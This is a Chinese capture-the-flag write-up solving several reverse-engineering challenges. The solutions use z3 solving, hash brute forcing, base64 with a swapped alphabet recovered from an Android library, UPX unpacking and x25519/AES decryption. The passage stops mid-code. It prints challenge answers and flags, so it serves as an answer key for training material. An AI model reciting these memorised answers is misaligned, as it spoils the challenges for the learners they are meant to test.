![](../../../images/901c4e7416d5628b19a3854310a97602.png)

这里是主要逻辑，上面有一大堆验证等式，可以用 z3 求解器解决。

```python
import z3
s = z3.Solver()
v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20,v21,v22 = z3.Ints('v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21 v22')
s.add(253 * v22
     + 299 * v21
     + 88 * v20
     + 323 * v19
     + 764 * v18
     + 349 * v17
     + 758 * v16
     + 233 * v15
     + 255 * v14
     + 343 * v13
     + 613 * v12
     + 629 * v11
     + 596 * v10
     + 183 * v9
     + 43 * v8
     + 482 * v7
     + 771 * v6
     + 42 * v5
     + 244 * v4
     + 651 * v3 == 403332)
...#太长了，省略一部分
s.add( 418 * v22
     + 937 * v21
     + 929 * v20
     + 419 * v19
     + 487 * v18
     + 985 * v17
     + 565 * v16
     + 601 * v15
     + 918 * v14
     + 293 * v13
     + 25 * v12
     + 593 * v11
     + 519 * v10
     + 301 * v9
     + 404 * v8
     + 719 * v7
     + 747 * v6
     + 108 * v5
     + 1001 * v4
     + 389 * v3 == 395149)
s.check()
print(s.model())
'''
enc = [92,8,44,68,35,37,39,25,68,74,63,33,13,96,3,34,45,23,7,28]
[v12 = 74,
 v21 = 7,
 v10 = 25,
 v16 = 96,
 v18 = 34,
 v14 = 33,
 v13 = 63,
 v22 = 28,
 v17 = 3,
 v19 = 45,
 v20 = 23,
 v11 = 68,
 v15 = 13,
 '''


```

解出来的东西直接运行 exe 输进去，不需要再写脚本了。

![](../../../images/3e0247fd27e736a852cbbea4abe2f8e8.png)

## <font style="color:#5C8D07;">ez_csgo</font>
```python
import hashlib
import uuid

cost = [1, 7, 17, 23, 49, 68, 79, 100]
num = [8, 6, 6, 6, 6, 6, 7, 8]

def main():
    print("某天，小k闲来无事，翻找自己的库存并卖出了一些东西")
    print("但他没有记录下他卖的东西，现在他求助于你，如果你能告诉他的话他就给你你想要的东西")
    print("要不要猜一下他怎么选的呢？输入8个整数：")
    
    input_values = []
    input_str=input().split()
    for i in range(8):
        try:
            value = int(input_str[i])
            if value < 0 or value > num[i]:
                print("输入数量超出范围，请重新输入")
                return
            input_values.append(value)
        except ValueError:
            print("输入无效，请输入整数")
            return
    
    total_cost = sum(input_values[i] * cost[i] for i in range(8))
    if total_cost != 1072:
        print("你猜错了，gg")
    
    str_input = ''.join(map(str, input_values))
    print(str_input)
    md5_hash = hashlib.md5(str_input.encode()).hexdigest()
    if md5_hash != "bd91b333c2c76df11963d2e78255462b":
        print("你猜错了，gg")
        return
    
    print("你猜对了，恭喜你！")
    
    sha1_hash = hashlib.sha1(str_input.encode()).hexdigest()
    uuid_v5 = uuid.uuid5(uuid.NAMESPACE_URL, sha1_hash)
    
    print(f"SCUCTF{{{uuid_v5}}}")

if __name__ == "__main__":
    main()

    
```

就是一个 DFS 题，不想写了，直接爆破哈希就行。

```python
import hashlib
for p1 in range(9):
    for p2 in range(7):
        for p3 in range(7):
            for p4 in range(7):
                for p5 in range(7):
                    for p6 in range(7):
                        for p7 in range(8):
                            for p8 in range(9):
                                str_input = str(p1) + str(p2) + str(p3) + str(p4) + str(p5) + str(p6) + str(p7) + str(p8)
                                md5_hash = hashlib.md5(str_input.encode()).hexdigest()
                                if md5_hash == "bd91b333c2c76df11963d2e78255462b":
                                    print(str_input)

                                    
```

## <font style="color:#5C8D07;">ChildApk</font>
```java
package com.example.apk2;

import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.activity.j;
import com.example.apk2.Boss;
import com.example.apk2.MainActivity;

/* loaded from: classes.dex */
public final class MainActivity extends j {

    /* renamed from: r, reason: collision with root package name */
    public static final /* synthetic */ int f429r = 0;

    /* JADX WARN: Type inference failed for: r6v1, types: [com.example.apk2.Boss, java.lang.Object] */
    @Override // androidx.activity.j, B.a, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        final ?? obj = new Object();
        View inflate = getLayoutInflater().inflate(R.layout.input, (ViewGroup) null);
        final EditText editText = (EditText) inflate.findViewById(R.id.editTextUsername);
        final EditText editText2 = (EditText) inflate.findViewById(R.id.editTextPassword);
        ((Button) inflate.findViewById(R.id.login_button)).setOnClickListener(new View.OnClickListener() { // from class: Q.a
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                boolean z2;
                String str;
                int i2 = MainActivity.f429r;
                MainActivity mainActivity = this;
                W.a.k(mainActivity, "this$0");
                Boss boss = obj;
                W.a.k(boss, "$boss");
                String obj2 = editText.getText().toString();
                String obj3 = editText2.getText().toString();
                boolean z3 = true;
                if (obj2.length() > 0) {
                    z2 = true;
                } else {
                    z2 = false;
                }
                if (obj3.length() <= 0) {
                    z3 = false;
                }
                if (z2 & z3) {
                    str = boss.stringFromJNI(obj2, obj3);
                } else {
                    str = "Not good enough";
                }
                Toast.makeText(mainActivity, str, 0).show();
            }
        });
        setContentView(inflate);
    }
}


```

看不出来什么东西，需要逆一下 .so 文件。

```c
__int64 __fastcall sub_830(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  const char *v6; // r13
  const char *v7; // r15
  unsigned __int64 v8; // rbx
  __int64 i; // rax
  size_t v10; // rbx
  size_t v11; // rbp
  size_t v12; // r12
  size_t v13; // rax
  unsigned __int64 v14; // r11
  size_t v15; // r10
  __int64 v16; // r9
  size_t v17; // rsi
  int v18; // r8d
  char v19; // cl
  int v20; // ebp
  __int64 v21; // rbx
  int v22; // esi
  int v23; // edi
  bool v24; // bl
  char v25; // dl
  __int64 v26; // rcx
  char v27; // cl
  __int64 v28; // r9
  __int64 v29; // rax
  unsigned __int64 v30; // rbp
  __int128 v32[6]; // [rsp+0h] [rbp-A8h] BYREF
  int v33; // [rsp+60h] [rbp-48h]
  char v34[9]; // [rsp+64h] [rbp-44h] BYREF
  char v35; // [rsp+6Dh] [rbp-3Bh]
  unsigned __int64 v36; // [rsp+70h] [rbp-38h]

  v36 = __readfsqword(0x28u);
  v6 = (*(*a1 + 1352LL))(a1, a3, 0LL);
  v7 = (*(*a1 + 1352LL))(a1, a4, 0LL);
  v35 = 0;
  v34[6] = 0;
  *&v34[7] = 0;
  strcpy(v34, "`exyp");
  if ( __strlen_chk(v34, 10LL) )
  {
    v8 = 0LL;
    do
      v34[v8++] ^= 0x17u;
    while ( __strlen_chk(v34, 10LL) > v8 );
  }
  if ( strlen(v6) != 64 )
    return (*(*a1 + 1336LL))(a1, v34);
  for ( i = 0LL; i != 64; i += 2LL )
  {
    if ( dword_2E50[i] != (v6[i] ^ 0x71) || dword_2E50[i + 1] != (v6[i + 1] ^ 0x71) )
      return (*(*a1 + 1336LL))(a1, v34);
  }
  memset(v32, 0, sizeof(v32));
  v33 = 0;
  if ( !*v7 )
  {
LABEL_36:
    v34[4] = byte_2E4A;
    *v34 = dword_2E46;
    if ( __strlen_chk(v34, 10LL) )
    {
      v30 = 0LL;
      do
        v34[v30++] ^= 0x18u;
      while ( __strlen_chk(v34, 10LL) > v30 );
    }
    return (*(*a1 + 1336LL))(a1, v34);
  }
  v10 = strlen(v7);
  v11 = strlen(v7);
  v12 = strlen(v7);
  v13 = strlen(v7);
  v14 = v11;
  v15 = v10;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0;
  do
  {
    if ( v15 <= v17 )
    {
      v20 = 0;
    }
    else
    {
      ++v18;
      v20 = v7[v17];
    }
    v21 = v18;
    v22 = 0;
    if ( v14 <= v18 )
    {
      v23 = 0;
      if ( v12 <= v18 )
        goto LABEL_21;
LABEL_20:
      ++v18;
      v22 = v7[v21];
      goto LABEL_21;
    }
    ++v18;
    v23 = v7[v21];
    v21 = v18;
    if ( v12 > v18 )
      goto LABEL_20;
LABEL_21:
    if ( v20 )
    {
      *(v32 + v16) = v6[v20 >> 2];
      v24 = v23 == 0;
    }
    else
    {
      *(v32 + v16) = 61;
      if ( !v23 )
      {
        v24 = 1;
        v25 = 61;
        v26 = v16;
        goto LABEL_26;
      }
      v24 = 0;
    }
    v25 = v6[(16 * v20) & 0x30 | (v23 >> 4)];
    v26 = v16 & 0xFFFFFFFC;
LABEL_26:
    *(v32 + (v26 | 1)) = v25;
    if ( !v24 || (v27 = 61, v22) )
      v27 = v6[(4 * v23) & 0x3C | (v22 >> 6)];
    *(v32 + v16 + 2) = v27;
    if ( v22 )
      v19 = v6[v22 & 0x3F];
    else
      v19 = 61;
    *(v32 + v16 + 3) = v19;
    v16 += 4LL;
    v17 = v18;
  }
  while ( v13 > v18 );
  if ( !v16 )
    goto LABEL_36;
  v28 = v16 & 0xFFFFFFFC;
  v29 = 0LL;
  while ( *(&unk_2F50 + 4 * v29) == __PAIR128__(
                                      __PAIR64__(*(v32 + v29 + 3), *(v32 + v29 + 2)),
                                      __PAIR64__(*(v32 + v29 + 1), *(v32 + v29))) )
  {
    v29 += 4LL;
    if ( v28 == v29 )
      goto LABEL_36;
  }
  return (*(*a1 + 1336LL))(a1, v34);
}


```

其实就是一个换表 base64，把密文和表提取出来，解一下就行了。

一开始的表是有问题的，需要异或一下 0x71。

![](../../../images/1299182a0c8979c691175a977c1fdb6a.png)

![](../../../images/0bbf306caf2d5de63acd873b0bd098eb.png)

密文的数据在表的下面，提取的时候需要小修一下，也就是删掉里面的 0。

![](../../../images/a25621436886c5a3c36d6508c8404d07.png)

## <font style="color:#5C8D07;">普通蟒蛇</font>
非常精妙的题！

对环境要求很苛刻，python 版本必须是 3.11。

给了一个 cython 的 so，然后 py 文件导入了这个模块，进行 check。

尝试逆向 so，逻辑很难看懂。

尝试手玩一下这个 check 函数，发现他是逐个字符检测的，也就是说我们可以一个一个字符去试，正确的时候返回 true，错误的时候返回 false，直接爆破即可。

```python
import check
#input_flag=input('Please input your flag: ').strip()
#if len(input_flag)!=17:
#    print('Your flag is too short!')
#elif check.check(input_flag):
#    print('Congratulations!')
#    print('Your flag is SCUCTF{'+input_flag+'}')
#else:
#    print('noooooooooooo!')
flag = check.check('Ju5T_3nj0y_py7h0n')
print(flag)


```

## <font style="color:#5C8D07;">cos90</font>
先看 pri2 这个 elf，加了壳，直接 upx -d 一把梭。

这里要注意使用最新版的脱壳工具，不然脱不出来。

用 ida 小逆一下，发现逻辑很简单。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[5]; // [rsp+7h] [rbp-19h] BYREF
  int v5; // [rsp+Ch] [rbp-14h]
  int v6; // [rsp+10h] [rbp-10h]
  int i; // [rsp+14h] [rbp-Ch]
  int v8; // [rsp+18h] [rbp-8h]
  int v9; // [rsp+1Ch] [rbp-4h]

  srand(0x7777u);
  puts("i sound you like xiaoyuankousuan???\nok, let's train for some times.");
  puts("i will give you some numbers, you should check which one is bigger.");
  v9 = 0;
  v8 = 0;
  while ( v8 <= 99999 )
  {
    v6 = rand() % 119;
    v5 = rand() % 119;
    if ( v6 != v5 )
    {
      printf("%d %d:", (unsigned int)v6, (unsigned int)v5);
      __isoc99_scanf("%1s", v4);
      if ( v4[0] == 62 )
      {
        if ( v6 <= v5 )
          goto LABEL_9;
        puts("yes");
        byte_4060[v9 % 32] += 5;
      }
      else
      {
        if ( v4[0] != 60 || v6 >= v5 )
        {
LABEL_9:
          puts("you are wrong!");
          exit(0);
        }
        puts("yes");
        byte_4060[v9 % 32] -= 3;
      }
      ++v9;
      ++v8;
    }
  }
  puts("Now i will give you what you need for the decrypt:");
  for ( i = 0; i <= 31; ++i )
    printf("%d,", byte_4060[i]);
  return 0LL;
}


```

就是以 0x7777 为种子，然后循环 100000 次，每次生两个随机数，进行比大小，比大小的结果决定了进行什么运算。

最后会给出有用的东西。

尝试用 pwntools 交互去做，但是发现好像 IO 有问题，所以手动写了一个 c 跑。

注意要在 linux 机子上跑，不然随机数不一样。

```c
#include<stdio.h>
unsigned char ans[32] =
{
  139, 208,  54, 133, 165,   5, 184, 107, 192,  35,
  249, 234, 105, 234,  86, 136,   3, 214, 135, 198,
   26,   0, 120, 159, 197,  27, 225, 123, 208, 159,
   64, 233
};
int main()
{
    srand(0x7777);
    int i = 0;
    while(i<=99999){
        int a = rand()%119;
        int b = rand()%119;
        if(a==b)continue;
        printf("%d %d\n",a,b);
        if(a>b){
            ans[i%32]+=5;
        }
        else{
            ans[i%32]-=3;
        }
        ++i;
    }
    i=0;
    for(i=0;i<=31;i++)printf("%d,",ans[i]);
    return 0;
}


```

输出结果如下。

```plain
132,153,255,14,190,6,137,44,105,204,194,131,138,43,151,105,228,143,40,175,35,185,161,32,70,252,234,4,153,176,25,18


```

看来 flag 并不在这里，转眼向 encrypt.exe 看去。

```c
// main.main
void __fastcall main_main()
{
  __int128 v0; // rdi
  int v1; // r8d
  int v2; // r9d
  __int64 v3; // r14
  __int128 v4; // xmm15
  unsigned __int64 v5; // rcx
  int v6; // r9d
  int v7; // r10d
  int v8; // r11d
  unsigned __int64 v9; // rax
  ecdh_PublicKey *p_ecdh_PublicKey; // rax
  _ptr_ecdh_x25519Curve v11; // rcx
  int v12; // r8d
  int v13; // r9d
  int v14; // r10d
  _ptr_ecdh_x25519Curve *v15; // r11
  ecdh_PublicKey *v16; // rdx
  __int64 v17; // r8
  __int64 v18; // r9
  __int64 v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rcx
  uint8 *v22; // rdx
  __int64 v23; // rbx
  __int64 v24; // rcx
  __int64 v25; // rbx
  int v26; // r8d
  int v27; // r9d
  int v28; // r10d
  int v29; // r11d
  __int64 File; // rax
  __int64 v31; // rcx
  int v32; // r8d
  int v33; // r9d
  int v34; // r10d
  int v35; // r11d
  __int64 v36; // rax
  unsigned __int64 v37; // rcx
  int v38; // r8d
  int v39; // r9d
  int v40; // r10d
  int v41; // r11d
  __int64 v42; // rdi
  char *v43; // rdx
  char *v44; // rbx
  int v45; // edi
  int v46; // esi
  int v47; // r9d
  int v48; // r10d
  int v49; // r11d
  __int64 v50; // rax
  int v51; // r8d
  int v52; // r9d
  int v53; // r10d
  int v54; // r11d
  __int64 v55; // rax
  int v56; // r8d
  int v57; // r9d
  int v58; // r10d
  int v59; // r11d
  __int64 v60; // [rsp-30h] [rbp-108h]
  __int64 v61; // [rsp-30h] [rbp-108h]
  __int64 v62; // [rsp-30h] [rbp-108h]
  __int64 v63; // [rsp-30h] [rbp-108h]
  __int64 v64; // [rsp-30h] [rbp-108h]
  __int64 v65; // [rsp-30h] [rbp-108h]
  __int64 v66; // [rsp-30h] [rbp-108h]
  __int64 v67; // [rsp-28h] [rbp-100h]
  __int64 v68; // [rsp-28h] [rbp-100h]
  __int64 v69; // [rsp-28h] [rbp-100h]
  __int64 v70; // [rsp-28h] [rbp-100h]
  __int64 v71; // [rsp-28h] [rbp-100h]
  __int64 v72; // [rsp-28h] [rbp-100h]
  __int64 v73; // [rsp-28h] [rbp-100h]
  _BYTE v74[24]; // [rsp-20h] [rbp-F8h]
  __int64 v75; // [rsp-20h] [rbp-F8h]
  __int64 v76; // [rsp-18h] [rbp-F0h]
  __int64 v77; // [rsp-10h] [rbp-E8h]
  int v78; // [rsp-8h] [rbp-E0h]
  char v79; // [rsp+0h] [rbp-D8h] BYREF
  unsigned __int64 v80; // [rsp+20h] [rbp-B8h]
  __int64 v81; // [rsp+28h] [rbp-B0h]
  __int64 v82; // [rsp+30h] [rbp-A8h]
  _ptr_ecdh_x25519Curve v83; // [rsp+38h] [rbp-A0h]
  __int64 v84; // [rsp+40h] [rbp-98h]
  __int64 v85; // [rsp+48h] [rbp-90h]
  __int64 v86; // [rsp+50h] [rbp-88h] BYREF
  __int64 v87; // [rsp+58h] [rbp-80h]
  int v88[2]; // [rsp+60h] [rbp-78h]
  int v89[2]; // [rsp+68h] [rbp-70h]
  __int64 v90; // [rsp+70h] [rbp-68h]
  __int64 v91; // [rsp+78h] [rbp-60h]
  const char *v92; // [rsp+80h] [rbp-58h]
  ecdh_PublicKey *v93; // [rsp+88h] [rbp-50h]
  __int64 v94; // [rsp+90h] [rbp-48h]
  _QWORD v95[2]; // [rsp+98h] [rbp-40h] BYREF
  __int128 v96; // [rsp+A8h] [rbp-30h]
  __int128 v97; // [rsp+B8h] [rbp-20h] BYREF
  int v98[2]; // [rsp+C8h] [rbp-10h]
  _ptr_ecdh_x25519Curve v99; // [rsp+D0h] [rbp-8h]

  while ( &v86 <= *(v3 + 16) )
    runtime_morestack_noctxt();
  v90 = runtime_stringtoslicebyte(
          &v79,
          "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076",
          64,
          v0,
          DWORD2(v0),
          v1,
          v2);
  v80 = v5;
  *(&v0 + 1) = "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076";
  v9 = encoding_hex_Decode(
         v90,
         "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076",
         v5,
         v90,
         "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076",
         v5,
         v6,
         v7,
         v8,
         v60,
         v67,
         *v74);
  if ( v9 > v80 )
    runtime_panicSliceAcap(v9, "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076", v9);
  v84 = v9;
  p_ecdh_PublicKey = main_generateKeyPair();
  v92 = "04e6b40de9119b77769890348d468f6993f0ea8108d4ae59fff51e5a6b330076";
  v83 = v11;
  *&v0 = v84;
  if ( crypto_ecdh_x25519PublicKeySize == v84 )
  {
    v93 = p_ecdh_PublicKey;
    v99 = crypto_ecdh_x25519;
    if ( v84 )
    {
      v19 = v84;
      v20 = runtime_growslice(
              &runtime_noptrbss,
              v84,
              0,
              v84,
              &RTYPE_uint8,
              v12,
              v13,
              v14,
              v15,
              v61,
              v68,
              *v74,
              *&v74[8]);
      *&v0 = v84;
      *(&v0 + 1) = v20;
      v17 = v21;
      v18 = v19;
    }
    else
    {
      *(&v0 + 1) = &runtime_noptrbss;
      v17 = 0LL;
      v18 = 0LL;
    }
    *v89 = v17;
    *v88 = v18;
    *v98 = *(&v0 + 1);
    runtime_memmove(*(&v0 + 1), v90, v0);
    p_ecdh_PublicKey = runtime_newobject(&RTYPE_ecdh_PublicKey);
    p_ecdh_PublicKey->curve.tab = go_itab__crypto_ecdh_x25519Curve_crypto_ecdh_Curve;
    if ( runtime_writeBarrier )
    {
      p_ecdh_PublicKey = runtime_gcWriteBarrier2();
      v11 = v99;
      *v15 = v99;
      v22 = *v98;
      v15[1] = *v98;
    }
    else
    {
      v11 = v99;
      v22 = *v98;
    }
    p_ecdh_PublicKey->curve.data = v11;
    p_ecdh_PublicKey->publicKey.len = *v88;
    LODWORD(v11) = v89[0];
    p_ecdh_PublicKey->publicKey.cap = *v89;
    p_ecdh_PublicKey->publicKey.ptr = v22;
    v16 = p_ecdh_PublicKey;
    LODWORD(p_ecdh_PublicKey) = v93;
  }
  else
  {
    v16 = 0LL;
  }
  v23 = v16;
  v91 = crypto_ecdh__ptr_PrivateKey_ECDH(p_ecdh_PublicKey, v16, v11, v0, DWORD2(v0), v12, v13, v14, v15, v61, v68);
  v81 = v23;
  v82 = v24;
  v25 = 8LL;
  File = os_ReadFile(
           "flag.txtGoString48828125avx512bwavx512vlnil PoolscavengepollDesctraceBufdeadlockraceFinipanicnilcgocheckrunnable procid rax     rbx     rcx     rdx     rdi     rsi     rbp     rsp     r8      r9      r10     r11     r12     r13     r14     r15     rip     rflags  cs      fs      gs       is not  pointer packed=BAD RANK status unknown(trigger= npages= nalloc= nfreed=[signal  newval= mcount= bytes,  stack=[ minLC=  maxpc= \tstack=[ minutes etypes ThursdaySaturdayFebruaryNovemberDecember%!Month(no anodeCancelIoReadFileAcceptExWSAIoctlshutdownwsaioctlgo/typesnet/httpgo/buildx509sha1Inherited244140625pclmulqdqpsapi.dllcomplex64interfaceinvalid nfuncargs(bad indirreflect: InterfaceprofBlockstackpoolhchanLeafwbufSpansmSpanDeadscavtraceinittracepanicwaitchan sendpreemptedcoroutinecopystack -> node= ms cpu,  (forced) wbuf1.n= wbuf2.n= s.limit= s.state= B work ( B exp.)  marked   unmarked in use)\n, size = bad prune, tail = recover:  not in [ctxt != 0, oldval=, newval= threads=: status= blocked= lockedg=atomicor8 runtime= m->curg=(unknown)traceback} stack=[ lockedm=WednesdaySeptemberrwxrwxrwxFindCloseLocalFreeMoveFileWWriteFileWSASendTontdll.dllmath/randtlsrsakex/dev/stdin12207031256103515625LockFileExWSASocketWws2_32.dllcomplex128t.Kind == notifyListprofInsertstackLargemSpanInUseGOMAXPROCSstop tracedisablethpinvalidptrschedtracesemacquiredebug call flushGen  MB goal, s.state =  s.base()= heapGoal=GOMEMLIMIT KiB now,  pages at  sweepgen= sweepgen , bound = , limit = tracefree(tracegc()\nexitThreadBad varintGC forced\n runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until pc=unknown pcruntime: ggoroutine %!Weekday(owner diedDnsQuery_WGetIfEntryCancelIoExCreatePipeGetVersionWSACleanupWSAStartupgetsockoptsetsockoptdnsapi.dllexecerrdothttp2debugcrypto/tls/dev/stdout/dev/stderrCloseHandleOpenProcessGetFileTypeshort write30517578125ProcessPrngMoveFileExWNetShareAddNetShareDeluserenv.dllunreachablebad argSizemethodargs(assistQueuenetpollInitreflectOffsglobalAllocmSpanManualstart traceclobberfreegccheckmarkscheddetailcgocall nil s.nelems=   of size  runtime: p  ms clock,  nBSSRoots=runtime: P  exp.) for minTrigger=GOMEMLIMIT=bad m value, elemsize= freeindex= span.list=, npages = tracealloc( p->status= in status  idleprocs= gcwaiting= schedtick= timerslen= mallocing=bad timedivfloat64nan1float64nan2float64nan3float32nan2GOTRACEBACK) at entry+ (targetpc= , plugin: runtime: g : frame.sp=created by broken pipebad messagefile existsbad addressRegCloseKeyCreateFileWDeleteFileWExitProcessFreeLibrarySetFileTimeVirtualLockWSARecvFromclosesocketgetpeernamegetsocknamecrypt32.dllmswsock.dllsecur32.dllshell32.dlli/o timeoutgocachehashgocachetesthttp2clienthttp2serverarchive/tartls10servercrypto/x509archive/zipshort buffer152587890625762939453125OpenServiceWRevertToSelfCreateEventWGetConsoleCPUnlockFileExVirtualQueryadvapi32.dlliphlpapi.dllkernel32.dllnetapi32.dllsweepWaiterstraceStringsspanSetSpinemspanSpecialgcBitsArenasmheapSpecialgcpacertracemadvdontneedharddecommitdumping heapchan receivelfstack.push span.limit= span.state=bad flushGen MB stacks, worker mode  nDataRoots= nSpanRoots= wbuf1=<nil> wbuf2=<nil> gcscandone runtime: gp= found at *( s.elemsize= B (鈭唃oal , cons/mark  maxTrigger= pages/byte\n s.sweepgen= allocCount end tracegc\nProcessPrng",
           8,
           v24,
           v0,
           DWORD2(v0),
           v26,
           v27,
           v28,
           v29,
           v62,
           v69);
  if ( v0 )
  {
    v85 = 8LL;
    v94 = File;
    v86 = v31;
    v97 = v4;
    *&v0 = *(v0 + 8);
    v97 = v0;
    log_Fatalf("Failed to read file: %v", 23, &v97, 1, 1, v32, v33, v34, v35, v63, v70, *v74, *&v74[8]);
    LODWORD(File) = v94;
    LODWORD(v31) = v86;
    v25 = v85;
  }
  v36 = main_encryptECB(File, v25, v31, v91, v81, v82, v33, v34, v35, v63, v70, *v74, *&v74[8]);
  v42 = v83;
  v43 = v83 + v25;
  if ( v37 < v83 + v25 )
  {
    v87 = v25;
    v44 = v83 + v25;
    v36 = runtime_growslice(v36, v44, v37, v83, &RTYPE_uint8, v38, v39, v40, v41, v64, v71, *v74, *&v74[8]);
    v42 = v83;
    v43 = v44;
    v25 = v87;
  }
  *v89 = v43;
  *v98 = v36;
  *v88 = v37;
  runtime_memmove(v36 + v25, v92, v42);
  v45 = v89[0];
  v46 = v88[0];
  v50 = os_WriteFile(
          "encrypted.bin3814697265625GetTempPath2WModule32NextWwakeableSleepprofMemActiveprofMemFuturetraceStackTabexecRI"
          "nternaltestRInternalGC sweep wait",
          13,
          v98[0],
          v89[0],
          v88[0],
          420,
          v47,
          v48,
          v49,
          v64,
          v71,
          *v74,
          v78);
  if ( v50 )
  {
    v97 = v4;
    *&v97 = *(v50 + 8);
    *(&v97 + 1) = 13LL;
    v45 = 1;
    v46 = 1;
    log_Fatalf("Failed to write encrypted file: %v", 34, &v97, 1, 1, v51, v52, v53, v54, v65, v72, v75, v76);
  }
  v96 = v4;
  v95[0] = &RTYPE_string;
  v95[1] = &off_507838;
  v55 = runtime_convTstring(
          "encrypted.bin3814697265625GetTempPath2WModule32NextWwakeableSleepprofMemActiveprofMemFuturetraceStackTabexecRI"
          "nternaltestRInternalGC sweep wait",
          13,
          &RTYPE_string,
          v45,
          v46,
          v51,
          v52,
          v53,
          v54,
          v65,
          v72);
  *&v96 = &RTYPE_string;
  *(&v96 + 1) = v55;
  fmt_Fprintln(go_itab__os_File_io_Writer, os_Stdout, v95, 2, 2, v56, v57, v58, v59, v66, v73, v75, v76, v77);
}


```

是用 go 语言写的，不太好看，但是逻辑很简单。

解密方式很简单，就是通过 Curve25519，利用公钥和私钥生成一个共享密钥，用这个共享密钥作为 AES-ECB 的 key 去解密文。

私钥就是我们刚才解出来的东西，公钥在哪呢？

我们动调一下，取了好多长度为 32 字节的东西都不对。去看了一眼 encrypted.bin，发现内容很长，会不会是把公钥输到了他的末尾呢？还真是，公钥就是 encrypted.bin 最后的  32 个字节。

```python
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def curve25519_shared_key(private_key_hex, peer_public_key_hex):
    """
    使用 Curve25519 算法计算共享密钥
    """
    private_key = bytes.fromhex(private_key_hex)
    peer_public_key = bytes.fromhex(peer_public_key_hex)
    # 创建 Curve25519 私钥对象
    private_key_obj = x25519.X25519PrivateKey.from_private_bytes(private_key)
    # 计算共享密钥
    shared_key = private_key_obj.exchange(x25519.X25519PublicKey.from_public_bytes(peer_public_key))
    return shared_key
def decrypt_aes_ecb(ciphertext_hex, aes_key):
    """
    使用 AES-ECB 解密密文
    """
    ciphertext = bytes.fromhex(ciphertext_hex)
    # 创建 AES 解密器
    cipher = Cipher(algorithms.AES(aes_key), modes.ECB())
    decryptor = cipher.decryptor()
    # 解密密文
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext
def main():
    # 输入：Curve25519 私钥和公钥
    private_key_list = [132,153,255,14,190,6,137,44,105,204,194,131,138,43,151,105,228,143,40,175,35,185,161,32,70,252,234,4,153,176,25,18]
    private_key_bytes = bytes(private_key_list)
    private_key_hex = private_key_bytes.hex()
    print(private_key_hex)
    peer_public_key_hex = 'A12768BB262522D74C16F5F45F26A943EA710EA65E2FB6BD58D2E9E6974F9262'
    # 输入：密文（AES-ECB 加密的密文）
    with open('encrypted.bin', 'rb') as file:
        ciphertext_bytes = file.read()
    ciphertext_hex = ciphertext_bytes.hex()  # 替换为你的密文（十六进制）
    print(ciphertext_hex)
    # 步骤 1：计算 Curve25519 的共享密钥
    shared_key = curve25519_shared_key(private_key_hex, peer_public_key_hex)
    print(f"共享密钥: {shared_key.hex()}")
    # 步骤 2：使用 AES-ECB 解密密文
    plaintext = decrypt_aes_ecb(ciphertext_hex, shared_key)
    try:
        print(f"解密后的明文: {plaintext.decode()}")
    except UnicodeDecodeError:
        print(f"解密后的明文（原始字节）：{plaintext}")
if __name__ == "__main__":
    main()


```

```plain
8499ff0ebe06892c69ccc2838a2b9769e48f28af23b9a12046fcea0499b01912
9acbf3caa5a98ee62c8fcfff11f0b7bd9e9f12e0d5aa4fbe668154a50a4cde87b8ae4a00a7f5f20d70b39cdad7e6ecd6a12768bb262522d74c16f5f45f26a943ea710ea65e2fb6bd58d2e9e6974f9262
共享密钥: f5b3e6dcfca6808783e1c59e81e94c54f72b1ad5d250b35ac7a810c1ff6a9054
解密后的明文（原始字节）：b'SCUCTF{CUrve25519_15_s0_E4sy555}\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\xb3C\x9fl\x9cN\x00G\x01\x07b\x95\x00Y\x9d\xdb96\xf3r\x83\x9c\xb9Q\xf9\x1b\xa1I\x0c\xc2S\xd8'


```

## <font style="color:#5C8D07;">time-complexity</font>
纯纯算法题，一共 10 个数据点，最后一个需要优化程序里面的算法，直接跑是跑不出来的。

flag 就是最后一个数据点的答案，包上 flag 头。

题意大致如下：

![](../../../images/4050a61bec9d9db384a3a2c0332f873c.png)

可以考虑容斥原理。

![](../../../images/3801c41da2a88cf9a291a9f173d467cb.png)

```cpp
#include<algorithm>
#include<iostream>
#include<cstring>
#define int long long
using namespace std;
const int N = 23000;
const int p = 1e9 + 7;
int f[N], s[N] = { 1 }, ans = 0, n, m, h[2][N][2], inv[N] = {1};
inline int qmi(int a, int k, int p) {
    int res = 1;
    while (k) {
        if (k & 1)res = res * a % p;
        a = a * a % p; k >>= 1;
    }
    return res;
}
inline int g(int n, int m) { return ((s[n] * inv[m]) % p * inv[n - m]) % p; }
signed main() {
    ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);
    cin >> n >> m;
    for (int i = 1; i <= (n << 1); i++) {
        s[i] = s[i - 1] * i % p;
        inv[i] = inv[i-1]*qmi(i, p - 2, p)%p;
    }
    //g[0][0] = 1;
    // for (int i = 1; i <= (n << 1); i++)for (int j = 1; j <= i; j++)g[i][j] = (g[i - 1][j - 1] + g[i - 1][j]) % p;
    for (int i = 1; i <= m; i++) {
        f[i] = qmi(2, i, p) * s[2 * n - 2 * i] % p;
        f[i] = f[i] * s[i] % p;
        f[i] = f[i] * g(m,i) % p;
    }
    ans = s[n << 1];
    h[0][0][0] = 1;
    for (int i = 1; i <= (n << 1) - 1; i++)for (int j = 0; j <= n; j++) {
